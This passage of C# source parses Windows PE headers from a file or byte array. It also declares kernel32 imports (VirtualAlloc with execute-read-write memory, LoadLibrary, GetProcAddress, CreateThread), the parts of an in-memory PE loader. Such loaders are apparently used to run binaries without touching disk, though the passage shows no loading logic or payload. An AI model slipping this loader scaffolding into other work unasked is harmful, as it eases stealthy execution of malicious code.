                public UInt16 NumberOfSections;
                public UInt32 TimeDateStamp;
                public UInt32 PointerToSymbolTable;
                public UInt32 NumberOfSymbols;
                public UInt16 SizeOfOptionalHeader;
                public UInt16 Characteristics;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;
                [FieldOffset(8)]
                public UInt32 VirtualSize;
                [FieldOffset(12)]
                public UInt32 VirtualAddress;
                [FieldOffset(16)]
                public UInt32 SizeOfRawData;
                [FieldOffset(20)]
                public UInt32 PointerToRawData;
                [FieldOffset(24)]
                public UInt32 PointerToRelocations;
                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;
                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;
                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;
                [FieldOffset(36)]
                public DataSectionFlags Characteristics;

                public string Section
                {
                    get { return new string(Name); }
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [Flags]
            public enum DataSectionFlags : uint
            {

                Stub = 0x00000000,

            }


            /// The DOS header

            private IMAGE_DOS_HEADER dosHeader;

            /// The file header

            private IMAGE_FILE_HEADER fileHeader;

            /// Optional 32 bit file header 

            private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

            /// Optional 64 bit file header 

            private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

            /// Image Section headers. Number of sections is in the file header.

            private IMAGE_SECTION_HEADER[] imageSectionHeaders;

            private byte[] rawbytes;



            public PELoader(string filePath)
            {
                // Read in the DLL or EXE and get the timestamp
                using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                    // Add 4 bytes to the offset
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                    if (this.Is32BitHeader)
                    {
                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    }
                    else
                    {
                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    }

                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                    {
                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                    }



                    rawbytes = System.IO.File.ReadAllBytes(filePath);

                }
            }

            public PELoader(byte[] fileBytes)
            {
                // Read in the DLL or EXE and get the timestamp
                using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                    // Add 4 bytes to the offset
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                    if (this.Is32BitHeader)
                    {
                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    }
                    else
                    {
                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    }

                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                    {
                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                    }


                    rawbytes = fileBytes;

                }
            }


            public static T FromBinaryReader<T>(BinaryReader reader)
            {
                // Read in a byte array
                byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

                // Pin the managed memory while, copy it out the data, then unpin it
                GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
                T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
                handle.Free();

                return theStructure;
            }



            public bool Is32BitHeader
            {
                get
                {
                    UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                    return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
                }
            }


            public IMAGE_FILE_HEADER FileHeader
            {
                get
                {
                    return fileHeader;
                }
            }


            /// Gets the optional header

            public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
            {
                get
                {
                    return optionalHeader32;
                }
            }


            /// Gets the optional header

            public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
            {
                get
                {
                    return optionalHeader64;
                }
            }

            public IMAGE_SECTION_HEADER[] ImageSectionHeaders
            {
                get
                {
                    return imageSectionHeaders;
                }
            }

            public byte[] RawBytes
            {
                get
                {
                    return rawbytes;
                }

            }

        }//End Class


        unsafe class NativeDeclarations
        {

            public static uint MEM_COMMIT = 0x1000;
            public static uint MEM_RESERVE = 0x2000;
            public static uint PAGE_EXECUTE_READWRITE = 0x40;
            public static uint PAGE_READWRITE = 0x04;

            [StructLayout(LayoutKind.Sequential)]
            public unsafe struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern IntPtr LoadLibrary(string lpFileName);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(

              IntPtr lpThreadAttributes,
              uint dwStackSize,
              IntPtr lpStartAddress,
              IntPtr param,
              uint dwCreationFlags,
              IntPtr lpThreadId
              );

            [DllImport("kernel32")]
            public static extern UInt32 WaitForSingleObject(

              IntPtr hHandle,
              UInt32 dwMilliseconds
              );

            [StructLayout(LayoutKind.Sequential)]
            public unsafe struct IMAGE_IMPORT_DESCRIPTOR
            {
                public uint OriginalFirstThunk;
                public uint TimeDateStamp;
                public uint ForwarderChain;
                public uint Name;
                public uint FirstThunk;
            }


        }
    }
}
